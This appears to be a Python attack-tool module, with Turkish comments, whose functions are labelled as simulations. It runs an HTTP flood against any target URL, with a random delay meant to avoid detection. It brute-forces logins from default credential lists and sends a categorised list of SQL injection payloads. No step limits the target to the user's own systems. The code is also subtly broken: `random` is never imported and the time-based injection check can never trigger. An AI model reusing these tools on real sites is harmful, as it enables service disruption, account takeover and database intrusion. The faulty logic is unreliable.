import httpx
import asyncio
import time
from pydantic import BaseModel, HttpUrl, Field
from typing import Optional, List, Dict, Any
from enum import Enum # HTTP metodları için

# --- Pydantic Modelleri ---

class HTTPMethod(str, Enum):
    GET = "GET"
    POST = "POST"
    # İhtiyaç duyarsanız diğer metodları ekleyebilirsiniz: PUT, DELETE, HEAD, OPTIONS

class DDoSParams(BaseModel):
    target_url: HttpUrl
    num_requests: int = Field(1000, gt=0, le=50000, description="Total number of requests to be sent")
    concurrency: int = Field(50, gt=0, le=500, description="Number of requestors working at the same time")
    method: HTTPMethod = Field(HTTPMethod.GET, description="HTTP method to use")
    payload: Optional[Dict[str, Any]] = Field(None, description="JSON payload for POST requests")
    headers: Optional[Dict[str, str]] = Field(None, description="Custom HTTP headers")
    timeout_seconds: float = Field(10.0, gt=0, description="Timeout for each request (seconds)")
    # Ekstra: İstekler arası rastgele bekleme (daha az tespit edilebilir olmak için)
    random_delay_ms_max: int = Field(0, ge=0, le=1000, description="Maximum random wait between requests (milliseconds, 0 = off)")

class BruteForceParams(BaseModel):
    target_url: HttpUrl
    usernames: List[str] = Field(default_factory=lambda: ["admin", "user", "testuser", "root"])
    passwords: List[str] = Field(default_factory=lambda: ["password", "123456", "admin", "qwerty", "test"])
    # Başarıyı tespit etmek için daha esnek bir yol:
    # Ya metin içerecek ya da belirli bir status koduna eşit olacak (VEYA ilişkisi)
    success_text_indicator: Optional[str] = Field(None, description="Text to search for in the response on successful login (case insensitive)")
    success_status_code: Optional[int] = Field(None, description="HTTP status code of successful login (e.g. 200, 302)")
    # Login formundaki alan adları (hedefe göre değişebilir)
    username_field: str = Field("username", description="The name of the username field in the form")
    password_field: str = Field("password", description="Name of the password field in the form")
    concurrency: int = Field(5, gt=0, le=20, description="Number of passwords to try at the same time (for each user)")
    stop_on_first_success: bool = Field(True, description="Stop all attempts on first successful login for any user")

class SQLInjectionParams(BaseModel):
    target_url: HttpUrl
    param_to_inject: str = Field(description="Parameter name where the payload will be injected (URL query or POST form field)")
    method: HTTPMethod = Field(HTTPMethod.GET, description="HTTP method to use")
    # POST istekleri için diğer form alanları (payload enjekte edilecek olan hariç)
    other_post_data: Optional[Dict[str, str]] = Field(None, description="Other form data other than the parameter to be injected for POST")
    base_value_for_param: Optional[str] = Field(None, description="Base value of the parameter to be injected (payload can be added around it)")
    # Daha kapsamlı payload listesi
    payload_categories: List[str] = Field(default_factory=lambda: ["error_based", "boolean_based", "time_based_light", "union_light"])
    # Başarıyı tespit etmek için (örn: SQL hatası, beklenmedik içerik, uzun yanıt süresi)
    error_indicator_texts: List[str] = Field(default_factory=lambda: ["sql syntax", "unclosed quotation mark", "odbc driver error", "mysql_fetch_array()"])
    # Boolean-based için farklı yanıtları karşılaştırma (daha karmaşık, şimdilik metin bazlı kalalım)
    # time_based_delay_seconds: int = Field(5, description="Zaman tabanlı payload'lar için beklenen minimum gecikme (saniye)")


# --- SQL Injection Payload'ları (Kategorilere Ayrılmış) ---
SQLI_PAYLOADS = {
    "error_based": [
        "'", "\"", "`", "\\", "';", "\";", "`sqlmap`",
        "' OR '1'='1", "\"' OR '\"'='\"'",
        " OR 1=1 --", " OR 1=1 #", " OR 1=1/*",
        "AND 1=1", "AND 1=2"
    ],
    "boolean_based": [ # Bunlar genellikle yanıtın değişip değişmediğine bakılarak tespit edilir
        "' AND '1'='1", "' AND '1'='2",
        "1' AND 1=(SELECT COUNT(*) FROM tablenames); --", # Tablename yerine geçerli bir tablo adı lazım
        "' OR 1=CAST(floor(RAND()*100) AS INT) -- " # Yanıtta rastgele sayılar aramak
    ],
    "time_based_light": [ # Test sistemlerinde kısa gecikmeler
        "' AND SLEEP(1)--", "' OR SLEEP(1)--",
        "1; SELECT PG_SLEEP(1)--", # PostgreSQL
        "1 WAITFOR DELAY '0:0:1'--", # SQL Server
        "benchmark(2000000,MD5(1))" # MySQL (CPU yoğun)
    ],
    "union_light": [ # Sütun sayısını tahmin etmek gerekir, bu basit bir başlangıç
        "' UNION SELECT null--",
        "' UNION SELECT null,null--",
        "' UNION SELECT null,null,null--",
        "' UNION SELECT 1,2,3 --", # Eğer sütunlar sayısal ise
        "' UNION SELECT 'a','b','c' --", # Eğer sütunlar metin ise
    ],
    "comment_out": [
        "--", "#", "/*", ";"
    ]
}


# --- DDoS Simülasyon Fonksiyonu ---
async def run_ddos_simulation(params: DDoSParams) -> Dict[str, Any]:
    print(f"Starting DDoS Simulation: Target={params.target_url}, İstek Sayısı={params.num_requests}, Synchronicity={params.concurrency}")
    successful_requests = 0
    failed_requests = 0
    status_codes_distribution: Dict[Any, int] = {} # Hem sayısal kodlar hem de "error" için
    request_times: List[float] = []
    start_time_total = time.time()

    async def send_single_request(session: httpx.AsyncClient, req_id: int):
        nonlocal successful_requests, failed_requests, status_codes_distribution, request_times
        if params.random_delay_ms_max > 0:
            delay = asyncio.sleep(random.randint(0, params.random_delay_ms_max) / 1000.0) # asyncio.sleep saniye cinsinden
            await delay

        start_req_time = time.time()
        try:
            if params.method == HTTPMethod.POST:
                response = await session.post(
                    str(params.target_url),
                    json=params.payload,
                    headers=params.headers,
                    timeout=params.timeout_seconds
                )
            else:
                response = await session.get(
                    str(params.target_url),
                    headers=params.headers,
                    timeout=params.timeout_seconds
                )
            
            end_req_time = time.time()
            request_times.append(end_req_time - start_req_time)
            status_codes_distribution[response.status_code] = status_codes_distribution.get(response.status_code, 0) + 1
            if 200 <= response.status_code < 400: # 3xx yönlendirmelerini de başarılı sayabiliriz
                successful_requests += 1
            else:
                failed_requests += 1
        except httpx.TimeoutException:
            failed_requests +=1
            status_codes_distribution["timeout"] = status_codes_distribution.get("timeout", 0) + 1
        except httpx.RequestError as exc:
            failed_requests += 1
            status_codes_distribution["error"] = status_codes_distribution.get("error", 0) + 1
            # print(f"İstek {req_id} hatası: {exc}")
        except Exception as e:
            failed_requests += 1
            status_codes_distribution["unknown_error"] = status_codes_distribution.get("unknown_error", 0) + 1
            # print(f"İstek {req_id} bilinmeyen hata: {e}")


    # Semaphore ile eşzamanlılık kontrolü
    semaphore = asyncio.Semaphore(params.concurrency)
    async def worker(session: httpx.AsyncClient, req_id: int):
        async with semaphore:
            await send_single_request(session, req_id)

    async with httpx.AsyncClient(verify=False) as client: # verify=False SSL hatalarını görmezden gelir (test için)
        tasks = [worker(client, i) for i in range(params.num_requests)]
        await asyncio.gather(*tasks, return_exceptions=True) # Hatalar olsa bile devam et

    end_time_total = time.time()
    total_duration_seconds = end_time_total - start_time_total
    requests_per_second = params.num_requests / total_duration_seconds if total_duration_seconds > 0 else 0
    avg_request_time_ms = (sum(request_times) / len(request_times) * 1000) if request_times else 0


    result = {
        "target_url": str(params.target_url),
        "method": params.method.value,
        "total_requests_attempted": params.num_requests,
        "successful_requests": successful_requests,
        "failed_requests": failed_requests,
        "status_codes_distribution": status_codes_distribution,
        "total_duration_seconds": round(total_duration_seconds, 3),
        "requests_per_second": round(requests_per_second, 2),
        "average_request_time_ms": round(avg_request_time_ms, 2)
    }
    print(f"DDoS Simulation Completed: {result}")
    return result


# --- Brute Force Simülasyon Fonksiyonu ---
async def run_bruteforce_simulation(params: BruteForceParams) -> Dict[str, Any]:
    print(f"Starting Brute Force Simulation: Target={params.target_url}")
    credentials_found: List[Dict[str, str]] = []
    total_attempts_made = 0
    simulation_halted = False

    async def try_single_login(session: httpx.AsyncClient, username: str, password: str) -> bool:
        nonlocal total_attempts_made
        total_attempts_made += 1
        login_payload = {params.username_field: username, params.password_field: password}
        try:
            response = await session.post(
                str(params.target_url),
                data=login_payload, # Genellikle form data olarak gönderilir
                timeout=15.0,
                follow_redirects=True # Login sonrası yönlendirmeleri takip et
            )
            response_text_lower = response.text.lower()

            success = False
            if params.success_status_code and response.status_code == params.success_status_code:
                success = True
            if not success and params.success_text_indicator and params.success_text_indicator.lower() in response_text_lower:
                success = True
            
            # Başarısız giriş denemelerinde de belirli bir metin/status kodu aranabilir
            # Örneğin, "Invalid username or password" veya 401 Unauthorized

            if success:
                print(f" Successful Login! User: {username}, Password: {password}")
                credentials_found.append({"username": username, "password": password})
                return True
        except httpx.RequestError as exc:
            # print(f"Login denemesi sırasında hata ({username}/{password}): {exc}")
            pass
        return False

    # Semaphore ile eşzamanlılık kontrolü (her kullanıcı için ayrı şifre denemeleri)
    semaphore = asyncio.Semaphore(params.concurrency)
    async def worker(session: httpx.AsyncClient, username: str, password: str) -> bool:
        async with semaphore:
            return await try_single_login(session, username, password)

    async with httpx.AsyncClient(verify=False) as client:
        for username in params.usernames:
            if simulation_halted: break
            print(f"User '{username}' for the ciphers are being tried...")
            password_tasks = [worker(client, username, password) for password in params.passwords]
            
            # gather ile tüm taskları çalıştır, biri başarılı olursa diğerlerini iptal etme mantığı eklenebilir
            # ancak şimdilik basit tutalım, tüm şifreleri deneyelim (eğer stop_on_first_success=False ise)
            results = await asyncio.gather(*password_tasks, return_exceptions=True)
            
            if any(res for res in results if isinstance(res, bool) and res): # Eğer bir başarılı giriş varsa
                if params.stop_on_first_success:
                    print(f"'{username}' password found for stop_on_first_success=True. Simulation is being stopped.")
                    simulation_halted = True
                    break # Dıştaki username döngüsünü kır

    result = {
        "target_url": str(params.target_url),
        "total_attempts_made": total_attempts_made,
        "credentials_found": credentials_found,
        "simulation_halted_early": simulation_halted and bool(credentials_found)
    }
    print(f"Brute Force Simulation Completed: {result}")
    return result


# --- SQL Injection Simülasyon Fonksiyonu ---
async def run_sqlinjection_simulation(params: SQLInjectionParams) -> Dict[str, Any]:
    print(f"Starting SQL Injection Simulation: Target={params.target_url}, Parameter={params.param_to_inject}")
    potentially_vulnerable_findings: List[Dict[str, Any]] = []
    total_payloads_tested = 0
    
    selected_payloads: List[str] = []
    for category in params.payload_categories:
        selected_payloads.extend(SQLI_PAYLOADS.get(category, []))
    
    if not selected_payloads:
        return {
            "message": "No SQLi payload found for the selected categories.",
            "target_url": str(params.target_url),
            "total_payloads_tested": 0,
            "potentially_vulnerable_findings": []
        }

    async with httpx.AsyncClient(verify=False, timeout=20.0) as client: # Timeout'u biraz artırabiliriz
        for payload_fragment in selected_payloads:
            total_payloads_tested += 1
            # Payload'ı oluştur (base_value ile birleştirme)
            full_payload_value = (params.base_value_for_param or "") + payload_fragment
            
            request_params_get: Optional[Dict[str, str]] = None
            request_data_post: Optional[Dict[str, str]] = None
            final_url_str = str(params.target_url)

            if params.method == HTTPMethod.GET:
                # URL'yi düzgün oluştur
                target_url_obj = httpx.URL(params.target_url)
                query_params = dict(target_url_obj.params) # Mevcut query'leri al
                query_params[params.param_to_inject] = full_payload_value # Hedef parametreyi payload ile değiştir
                final_url_str = str(target_url_obj.copy_with(query=query_params))
            else: # POST
                request_data_post = params.other_post_data.copy() if params.other_post_data else {}
                request_data_post[params.param_to_inject] = full_payload_value

            try:
                start_time = time.time()
                if params.method == HTTPMethod.GET:
                    response = await client.get(final_url_str)
                else: # POST
                    response = await client.post(final_url_str, data=request_data_post)
                end_time = time.time()
                response_time_seconds = end_time - start_time
                
                response_text_lower = response.text.lower()
                vulnerability_detected = False
                detection_reason = []

                for error_indicator in params.error_indicator_texts:
                    if error_indicator.lower() in response_text_lower:
                        vulnerability_detected = True
                        detection_reason.append(f"Error indicator found: '{error_indicator}'")
                        break # İlk hatayı bulunca yeterli

                # Zaman tabanlı kontrol (çok basit bir versiyon)
                if "time_based" in params.payload_categories: # Sadece time_based payload'lar için
                    # Bu örnekte basitçe, eğer payload'da SLEEP(N) varsa ve yanıt süresi N'den büyükse
                    # (artı bir miktar ağ gecikmesi) zafiyetli sayılabilir.
                    # Daha sofistike bir analiz gerekir.
                    # Örneğin payload_fragment içinde "SLEEP(X)" gibi bir ifade varsa X'i parse et.
                    # Şimdilik, genel bir zaman aşımı (timeout) ile veya çok uzun süren isteklerle tespit edilebilir.
                    # Bu kısım projenin detayına göre geliştirilebilir.
                    if response_time_seconds > (SQLI_PAYLOADS["time_based_light"][0].count("SLEEP(") * 1.0 + 2.0): # örnek bir sleep süresi + 2sn tolerans
                         if "SLEEP" in payload_fragment.upper(): # Sadece SLEEP içeren payload'lar için
                            vulnerability_detected = True
                            detection_reason.append(f"Potential time-based detection: Response time {response_time_seconds:.2f}s with payload '{payload_fragment}'")


                if vulnerability_detected:
                    print(f" Potential SQL Injection Found! Payload: {payload_fragment}, Cause: {detection_reason}")
                    potentially_vulnerable_findings.append({
                        "payload_used": payload_fragment,
                        "full_value_sent": full_payload_value,
                        "response_status": response.status_code,
                        "response_time_seconds": round(response_time_seconds, 3),
                        "detection_reasons": detection_reason
                    })

            except httpx.TimeoutException:
                 if "time_based" in params.payload_categories and "SLEEP" in payload_fragment.upper():
                    print(f" Potential Time-based SQL Injection (Timeout)! Payload {payload_fragment}")
                    potentially_vulnerable_findings.append({
                        "payload_used": payload_fragment,
                        "full_value_sent": full_payload_value,
                        "response_status": "Timeout",
                        "response_time_seconds": params.timeout_seconds, # httpx.AsyncClient timeout'u
                        "detection_reasons": ["Request timed out, potential time-based SQLi"]
                    })
            except httpx.RequestError as exc:
                # print(f"SQLi denemesi sırasında hata ({payload_fragment}): {exc}")
                pass

    result = {
        "target_url": str(params.target_url),
        "parameter_tested": params.param_to_inject,
        "method_used": params.method.value,
        "total_payloads_tested": total_payloads_tested,
        "potentially_vulnerable_findings": potentially_vulnerable_findings
    }
    print(f"SQL Injection Simulation Completed: {result}")
    return result

# Gerekirse başka simülasyon fonksiyonları buraya eklenebilir
# Örneğin, XSS simülasyonu, Path Traversal vb.